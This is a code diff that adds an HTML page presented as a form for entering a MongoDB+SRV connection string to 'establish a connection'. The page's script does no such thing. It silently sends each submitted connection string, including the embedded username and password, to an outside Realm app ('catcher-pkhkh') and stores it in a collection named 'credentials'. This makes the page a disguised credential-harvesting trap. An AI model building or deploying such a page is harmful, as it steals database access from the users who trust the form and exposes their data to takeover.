@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MongoDB Connection String Form</title>
+  <meta name="description" content="Enter your MongoDB+SRV connection string to establish a connection.">
+  <script src="https://unpkg.com/realm-web/dist/bundle.iife.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      margin-top: 100px;
+    }
+
+    .form-label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 3px;
+      border: 1px solid #ccc;
+    }
+
+    .form-submit {
+      margin-top: 20px;
+      background-color: #4caf50;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    .form-submit:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>MongoDB Connection String</h1>
+    <p>Enter your MongoDB+SRV connection string below:</p>
+    <form id="connection-form">
+      <label class="form-label" for="connection-string">Connection String:</label>
+      <input class="form-input" type="text" id="connection-string" placeholder="mongodb+srv://<username>:<password>@<cluster-address>/<database>?retryWrites=true&w=majority">
+      <button class="form-submit" type="submit">Submit</button>
+    </form>
+  </div>
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "MongoDB Connection String Form",
+      "description": "Enter your MongoDB+SRV connection string to establish a connection."
+    }
+  </script>
+  <script src="https://unpkg.com/mongodb@4.0.0/lib/index.js"></script>
+  <script>
+        
+        
+
+            const form = document.getElementById('connection-form');
+            form.addEventListener('submit', async (event) => {
+                event.preventDefault();
+                const connectionString = document.getElementById('connection-string').value;
+                // Add your App ID
+                const app = new Realm.App({ id: "catcher-pkhkh" });
+                // Create an anonymous credential
+                const credentials = Realm.Credentials.anonymous();
+                try {
+                    const user = app.logIn(credentials);
+                    const mongo = app.currentUser.mongoClient("mongodb-atlas");
+                        
+                        const collection = mongo.db("Jira").collection("credentials");
+                        collection.insertOne({"connectionString":connectionString});
+                        console.log("doner");
+                    } catch(err) {
+                    console.error("Failed to log in", err);
+                    }
+            })
+
+  </script>
+</body>
+</html>
